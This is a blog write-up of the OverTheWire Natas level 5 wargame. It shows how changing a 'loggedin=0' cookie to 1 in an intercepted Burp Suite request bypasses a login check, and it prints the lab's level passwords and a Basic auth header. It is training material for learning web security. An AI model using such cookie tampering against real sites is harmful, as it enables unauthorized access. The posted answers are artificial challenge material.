---
layout: post
title: Overthewire Natas Level 5
subtitle: ... Write up
tags: [overthewire, natas, level5, overthewire-natas, writeup]
---

## Natas Level 5
* Username: natas5
* Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
* URL:      http://natas5.natas.labs.overthewire.org


**Step 1:** Let Login to the URL, you will see the message
> Access disallowed. You are not logged in

**Step 2:** Check Page Source and Robotics file as usual but I could not find anythings useful from those.

**Step 3:** Again, I think I need Burp Suite. Capture the GET response from Burp
```
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __cfduid=dc69616187b4a387a963c02e8d931c8f61524815545; __utma=176859643.1702516967.1524815549.1524815549.1524836149.2; __utmz=176859643.1524815549.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); loggedin=0
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
**Step 4:** Look at the Cookie, _loggedin=0_. Ah ha, we are familiar to 1 and 0 as binary code. _loggedin=0_ is not login so what happen if it become 1. Change 0 to 1 and forward the request. <br>
Awesome!
```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
